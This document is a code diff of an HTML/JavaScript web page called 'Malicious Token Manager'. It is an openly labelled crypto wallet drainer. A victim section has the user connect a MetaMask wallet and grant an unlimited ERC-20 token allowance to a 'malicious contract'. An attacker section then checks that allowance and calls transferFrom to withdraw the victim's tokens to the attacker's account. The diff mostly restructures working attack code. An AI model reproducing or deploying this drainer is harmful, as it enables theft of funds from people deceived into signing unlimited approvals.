@@ -5,6 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Malicious Token Manager</title>
     <style>
+        #victimSection {
+            margin-top: 50px;
+            border-top: 1px solid #000;
+            padding-top: 20px;
+        }
+
         #attackerSection {
             margin-top: 50px;
             border-top: 1px solid #000;
@@ -15,36 +21,25 @@
 <body>
     <h1>Malicious Token Manager</h1>
 
-    <!-- Victim Section -->
-    <h2>Victim: Approve Malicious Token Manager</h2>
-    <button id="connectVictimWalletBtn">Connect Victim Wallet</button>
-    <button id="approveTokensBtn" style="display:none;">Approve Tokens</button>
-    <p id="victimStatus"></p>
-
-    <h3>Instructions for Victim:</h3>
-    <p>Connect your wallet and approve the malicious contract to spend unlimited tokens on your behalf.</p>
-
-    <!-- Attacker Section -->
-    <div id="attackerSection">
-        <h2>Attacker: Interact with Malicious Contract</h2>
-        <button id="connectAttackerWalletBtn">Connect Attacker Wallet</button>
-        <button id="checkAllowanceBtn" disabled>Check Allowance</button>
-        <button id="transferTokensBtn" disabled>Withdraw Tokens</button>
-        <button id="deployerWithdrawBtn" disabled>Deployer Withdraw</button>
-
-        <h3>Instructions for Attacker:</h3>
-        <p>Once the victim has approved the malicious contract, you can check the allowance, withdraw tokens from the victim's account, or withdraw tokens as the deployer.</p>
-    </div>
-
+    <!-- Common Elements -->
     <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
+
     <script>
+        // Common Variables
         let web3;
         let accounts;
-        let contract;
         let tokenContract;
-        let victimAccount;
-        const maliciousContractAddress = "0xf8e81D47203A594245E36C48e151709F0C19fBe8"; // Replace with malicious contract address
-        const tokenAddress = "0xb556Deb94276a61b2f749022ca61c9BbBb1A8D5A"; // Replace with ERC-20 token address
+        let maliciousContract;
+        const tokenAddress = "0xb556Deb94276a61b2f749022ca61c9BbBb1A8D5A";  // Replace with ERC-20 token address
+        const maliciousContractAddress = "0xf8e81D47203A594245E36C48e151709F0C19fBe8";  // Replace with malicious contract address
+
+        // Common ABI (Token and Malicious Contract ABI)
+        const tokenABI = [
+            { "inputs": [ { "internalType": "uint256", "name": "_initialSupply", "type": "uint256" } ], "stateMutability": "nonpayable", "type": "constructor" },
+            { "inputs": [ { "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" } ], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
+            { "inputs": [ { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" } ], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
+            { "inputs": [ { "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" } ], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }
+        ];
 
         const maliciousContractABI = [
             { "inputs": [ { "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" } ], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
@@ -53,114 +48,113 @@
             { "inputs": [ { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" } ], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
             { "inputs": [ { "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" } ], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }
         ];
-
-        const tokenABI = [
-            { "inputs": [ { "internalType": "uint256", "name": "_initialSupply", "type": "uint256" } ], "stateMutability": "nonpayable", "type": "constructor" },
-            { "inputs": [ { "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" } ], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
-            { "inputs": [ { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" } ], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
-            { "inputs": [ { "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" } ], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
-            { "inputs": [ { "internalType": "address", "name": "", "type": "address" } ], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }
-        ];
-
-        // Function to connect victim's wallet
-        async function connectVictimWallet() {
-            if (typeof window.ethereum !== 'undefined') {
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                web3 = new Web3(window.ethereum);
-                accounts = await web3.eth.getAccounts();
-                victimAccount = accounts[0];
-                document.getElementById('victimStatus').innerText = `Connected: ${victimAccount}`;
-                document.getElementById("approveTokensBtn").style.display = "inline-block";
-
-                tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
-            } else {
-                alert("Please install MetaMask!");
-            }
-        }
-
-        // Function to connect attacker's wallet
-        async function connectAttackerWallet() {
-            if (typeof window.ethereum !== 'undefined') {
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                web3 = new Web3(window.ethereum);
-                accounts = await web3.eth.getAccounts();
-                document.getElementById('attackerStatus').innerText = `Connected: ${accounts[0]}`;
-
-                contract = new web3.eth.Contract(maliciousContractABI, maliciousContractAddress);
-                tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
-                document.getElementById("checkAllowanceBtn").disabled = false;
-                document.getElementById("transferTokensBtn").disabled = false;
-                document.getElementById("deployerWithdrawBtn").disabled = false;
-            } else {
-                alert("Please install MetaMask!");
-            }
-        }
-
-        // Event listeners for buttons
-        document.getElementById("connectVictimWalletBtn").addEventListener("click", connectVictimWallet);
-        document.getElementById("connectAttackerWalletBtn").addEventListener("click", connectAttackerWallet);
-
-        // Victim's approval section
-        document.getElementById("approveTokensBtn").addEventListener("click", async () => {
-            try {
-                const unlimitedAmount = web3.utils.toHex('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
-                await tokenContract.methods.approve(maliciousContractAddress, unlimitedAmount).send({ from: victimAccount });
-                document.getElementById('victimStatus').innerText = `Approval successful! Unlimited tokens have been approved.`;
-            } catch (error) {
-                document.getElementById('victimStatus').innerText = "Approval failed!";
-                console.error("Error during approval:", error);
-            }
-        });
-
-        // Attacker's interaction section
-        document.getElementById("checkAllowanceBtn").addEventListener("click", async () => {
-            const victimAddress = prompt("Enter victim's wallet address:");
-            if (victimAddress) {
-                try {
-                    const allowance = await contract.methods.allowance(victimAddress, maliciousContractAddress).call();
-                    const allowanceBN = web3.utils.toBN(allowance);
-                    if (allowanceBN.gt(web3.utils.toBN(0))) {
-                        alert(`The victim has granted an allowance of ${allowanceBN.toString()} tokens to the malicious contract.`);
-                    } else {
-                        alert("The victim has not granted any allowance to the malicious contract.");
-                    }
-                } catch (error) {
-                    alert("An error occurred while checking the allowance.");
-                    console.error(error);
-                }
-            }
-        });
-
-        document.getElementById("transferTokensBtn").addEventListener("click", async () => {
-            const victimAddress = prompt("Enter victim's wallet address:");
-            const amount = prompt("Enter the amount to withdraw:");
-            if (victimAddress && amount) {
-                try {
-                    await contract.methods.transferFrom(victimAddress, accounts[0], amount).send({ from: accounts[0] });
-                    alert(`${amount} tokens withdrawn from the victim's account!`);
-                } catch (error) {
-                    alert("An error occurred while transferring tokens.");
-                    console.error(error);
-                }
-            }
-        });
-
-        document.getElementById("deployerWithdrawBtn").addEventListener("click", async () => {
-            const deployerAddress = accounts[0];
-            try {
-                const contractBalance = await tokenContract.methods.balanceOf(maliciousContractAddress).call();
-                if (contractBalance > 0) {
-                    await tokenContract.methods.transfer(deployerAddress, contractBalance).send({ from: deployerAddress });
-                    alert(`All tokens withdrawn to the deployer's address!`);
-                } else {
-                    alert("No tokens available in the malicious contract.");
-                }
-            } catch (error) {
-                alert("An error occurred while withdrawing tokens.");
-                console.error(error);
-            }
-        });
     </script>
+
+    <!-- Victim Section -->
+    <div id="victimSection">
+        <h2>Victim: Approve Malicious Token Manager</h2>
+        <button id="connectVictimWalletBtn">Connect Victim Wallet</button>
+        <button id="approveTokensBtn" style="display:none;">Approve Tokens</button>
+        <p id="victimStatus"></p>
+        <h3>Instructions for Victim:</h3>
+        <p>Connect your wallet and approve the malicious contract to spend unlimited tokens on your behalf.</p>
+
+        <script>
+            // Connect Victim Wallet
+            document.getElementById("connectVictimWalletBtn").addEventListener("click", connectVictimWallet);
+            
+            async function connectVictimWallet() {
+                if (typeof window.ethereum !== 'undefined') {
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    web3 = new Web3(window.ethereum);
+                    accounts = await web3.eth.getAccounts();
+                    document.getElementById('victimStatus').innerText = `Connected: ${accounts[0]}`;
+                    document.getElementById("approveTokensBtn").style.display = "inline-block";
+                    tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
+                } else {
+                    alert("Please install MetaMask!");
+                }
+            }
+
+            // Approve tokens for malicious contract
+            document.getElementById("approveTokensBtn").addEventListener("click", async () => {
+                try {
+                    const unlimitedAmount = web3.utils.toHex('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+                    await tokenContract.methods.approve(maliciousContractAddress, unlimitedAmount).send({ from: accounts[0] });
+                    document.getElementById('victimStatus').innerText = "Approval successful! Unlimited tokens approved.";
+                } catch (error) {
+                    document.getElementById('victimStatus').innerText = "Approval failed!";
+                    console.error("Error during approval:", error);
+                }
+            });
+        </script>
+    </div>
+
+    <!-- Attacker Section -->
+    <div id="attackerSection">
+        <h2>Attacker: Interact with Malicious Contract</h2>
+        <button id="connectAttackerWalletBtn">Connect Attacker Wallet</button>
+        <button id="checkAllowanceBtn" disabled>Check Allowance</button>
+        <button id="transferTokensBtn" disabled>Withdraw Tokens</button>
+        <p id="attackerStatus"></p>
+        <h3>Instructions for Attacker:</h3>
+        <p>Once the victim has approved the malicious contract, you can check the allowance, withdraw tokens from the victim's account, or withdraw tokens as the deployer.</p>
+
+        <script>
+            // Connect Attacker Wallet
+            document.getElementById("connectAttackerWalletBtn").addEventListener("click", connectAttackerWallet);
+            
+            async function connectAttackerWallet() {
+                if (typeof window.ethereum !== 'undefined') {
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    web3 = new Web3(window.ethereum);
+                    accounts = await web3.eth.getAccounts();
+                    document.getElementById('attackerStatus').innerText = `Connected: ${accounts[0]}`;
+                    maliciousContract = new web3.eth.Contract(maliciousContractABI, maliciousContractAddress);
+                    tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
+                    document.getElementById("checkAllowanceBtn").disabled = false;
+                    document.getElementById("transferTokensBtn").disabled = false;
+                } else {
+                    alert("Please install MetaMask!");
+                }
+            }
+
+            // Check Allowance
+            document.getElementById("checkAllowanceBtn").addEventListener("click", async () => {
+                const victimAddress = prompt("Enter victim's wallet address:");
+                if (victimAddress) {
+                    try {
+                        const allowance = await maliciousContract.methods.allowance(victimAddress, maliciousContractAddress).call();
+                        if (allowance > 0) {
+                            alert(`Allowance: ${allowance} tokens granted.`);
+                        } else {
+                            alert("No allowance granted.");
+                        }
+                    } catch (error) {
+                        alert("Error while checking allowance.");
+                        console.error(error);
+                    }
+                }
+            });
+
+            // Withdraw Tokens
+            document.getElementById("transferTokensBtn").addEventListener("click", async () => {
+                const victimAddress = prompt("Enter victim's wallet address:");
+                const amount = prompt("Enter the amount to withdraw:");
+                if (victimAddress && amount) {
+                    try {
+                        await maliciousContract.methods.transferFrom(victimAddress, accounts[0], amount).send({ from: accounts[0] });
+                        alert(`${amount} tokens withdrawn.`);
+                    } catch (error) {
+                        alert("Error during withdrawal.");
+                        console.error(error);
+                    }
+                }
+            });
+        </script>
+    </div>
 </body>
 </html>
+
+
 
